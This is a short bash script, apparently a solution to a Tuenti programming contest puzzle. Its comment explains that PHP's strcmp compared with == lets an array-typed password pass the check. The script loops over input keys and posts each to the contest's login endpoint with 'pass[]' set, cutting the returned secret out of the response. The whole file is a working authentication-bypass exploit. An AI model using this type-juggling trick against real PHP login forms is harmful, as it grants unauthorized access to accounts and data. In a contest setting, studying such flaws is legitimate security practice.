#/bin/bash

# Noticed that strcmp will return 0 when comparing a value to an array
# when == is used instead of ===. Send a pass as an array in curl,
# and php will return the key.

while read LINE
do echo "OLA KE ASE" | curl  -s -d "key=""$LINE""&pass[]=php_is_a_horrible_piece_of_beeep" http://pauth.contest.tuenti.net/ | cut -d' ' -f4
done
